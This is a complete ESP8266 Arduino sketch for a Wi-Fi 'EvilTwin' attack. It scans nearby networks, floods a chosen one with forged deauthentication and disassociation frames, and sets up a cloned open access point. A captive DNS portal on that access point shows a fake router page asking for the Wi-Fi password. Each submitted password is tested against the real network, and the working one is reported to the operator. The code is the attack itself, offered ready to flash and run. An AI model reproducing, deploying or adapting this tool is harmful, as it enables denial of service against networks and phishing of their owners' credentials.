#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

// Updated HTML Templates with Enhanced Styling
const String _baseHTMLStart = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="initial-scale=1.0, width=device-width">
  <title>Secure Network Interface</title>
  <style>
    body {
      background-color: #1c1c1c;
      color: #33ff33;
      font-family: 'Courier New', Courier, monospace;
      margin: 0;
      padding: 20px;
    }
    .container {
      max-width: 800px;
      margin: auto;
    }
    h1, h2, h3 {
      text-align: center;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th, td {
      padding: 12px;
      border: 1px solid #33ff33;
      text-align: left;
    }
    th {
      background-color: #333;
    }
    tr:nth-child(even) {
      background-color: #2a2a2a;
    }
    button {
      padding: 8px 16px;
      background-color: #33ff33;
      color: #000;
      border: none;
      cursor: pointer;
      font-family: 'Courier New', Courier, monospace;
    }
    button:hover {
      background-color: #00cc00;
    }
    button.selected {
      background-color: #ff3333;
      color: #fff;
      cursor: default;
    }
    .form-inline {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      padding: 8px;
      width: 300px;
      background-color: #000;
      color: #33ff33;
      border: 1px solid #33ff33;
      font-family: 'Courier New', Courier, monospace;
    }
    input[type="submit"] {
      padding: 10px 20px;
      background-color: #33ff33;
      color: #000;
      border: none;
      cursor: pointer;
      font-family: 'Courier New', Courier, monospace;
    }
    input[type="submit"]:hover {
      background-color: #00cc00;
    }
    .message {
      text-align: center;
      margin-top: 20px;
      font-size: 1.2em;
    }
  </style>
</head>
<body>
  <div class="container">
)rawliteral";

const String _baseHTMLEnd = R"rawliteral(
  </div>
</body>
</html>
)rawliteral";

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  
  // Configure and start the Access Point
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("TPlinksecure", "mafia007");
  
  // Start DNS Server
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

  // Define Web Server Routes
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  Serial.println("Setup complete. Access the web interface.");
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

// Handler for the Result Page
void handleResult() {
  String html = _baseHTMLStart;
  html += "<h2>Connection Status</h2>";
  if (WiFi.status() != WL_CONNECTED) {
    html += "<div class='message'>Wrong Password! Please, try again.</div>";
    html += "<script> setTimeout(function(){window.location.href = '/';}, 3000); </script>";
    Serial.println("Wrong password tried!");
  } else {
    html += "<div class='message'>Good password! Connected successfully.</div>";
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    
    // Reconfigure AP
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("TPlinksecure", "mafia007");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    
    _correct = "Successfully connected to: " + _selectedNetwork.ssid + " with Password: " + _tryPassword;
    Serial.println("Good password was entered!");
    Serial.println(_correct);
    html += "<h3>" + _correct + "</h3>";
  }
  html += _baseHTMLEnd;
  webServer.send(200, "text/html", html);
}

// Updated Handle Index with Enhanced Interface
void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("TPlinksecure", "mafia007");
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  String html = _baseHTMLStart;

  if (hotspot_active == false) {
    html += "<h1>Available Networks</h1>";

    // Action Buttons
    html += "<div class='form-inline'>";
    html += "<form method='post' action='/?deauth=";
    html += deauthing_active ? "stop" : "start";
    html += "'>";
    html += "<button type='submit'>";
    html += deauthing_active ? "Stop Deauthing" : "Start Deauthing";
    html += "</button></form>";

    html += "<form method='post' action='/?hotspot=";
    html += hotspot_active ? "stop" : "start";
    html += "'>";
    html += "<button type='submit'>";
    html += hotspot_active ? "Stop EvilTwin" : "Start EvilTwin";
    html += "</button></form>";
    html += "</div>";

    // Networks Table
    html += "<table>";
    html += "<tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Signal Strength</th><th>Select</th></tr>";

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") {
        break;
      }
      html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td><td>" + String(WiFi.RSSI(i)) + " dBm</td><td>";
      html += "<form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
      
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        html += "<button type='submit' class='selected' disabled>Selected</button>";
      } else {
        html += "<button type='submit'>Select</button>";
      }
      html += "</form></td></tr>";
    }
    html += "</table>";

    // Display Success Message
    if (_correct != "") {
      html += "<div class='message'>" + _correct + "</div>";
    }

    html += _baseHTMLEnd;
    webServer.send(200, "text/html", html);

  } else {
    // Hotspot Active: Show Password Entry Page
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      html += "<h2>Updating, please wait...</h2>";
      html += "<script> setTimeout(function(){window.location.href = '/result';}, 15000); </script>";
    } else {
      html += "<h2>Router: '" + _selectedNetwork.ssid + "'</h2>";
      html += "<form action='/' method='post'>";
      html += "<label for='password'>Enter Wi-Fi Password:</label><br><br>";
      html += "<input type='password' id='password' name='password' placeholder='Password' minlength='8' required><br><br>";
      html += "<input type='submit' value='Submit'>";
      html += "</form>";
    }

    html += _baseHTMLEnd;
    webServer.send(200, "text/html", html);
  }
}

// Handler for Admin Page (Same as handleIndex but can be customized further if needed)
void handleAdmin() {
  // For simplicity, reusing handleIndex. Modify if separate admin functionalities are required.
  handleIndex();
}

// Utility Function to Convert BSSID Bytes to String
String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow =  0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Deauthentication Attack Logic
  if (deauthing_active && millis() - deauth_now >= 1000) {
    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 
                                 0xFF, 0xFF, 0xFF, 0xFF, 
                                 0xFF, 0xFF, 0xFF, 0xFF, 
                                 0xFF, 0xFF, 0xFF, 0xFF, 
                                 0xFF, 0xFF, 0xFF, 0xFF, 
                                 0xFF, 0x00, 0x00, 0x01, 
                                 0x00};

    // Set BSSID in the deauth packet
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  // Periodic Wi-Fi Scan
  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  // Wi-Fi Status Check
  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
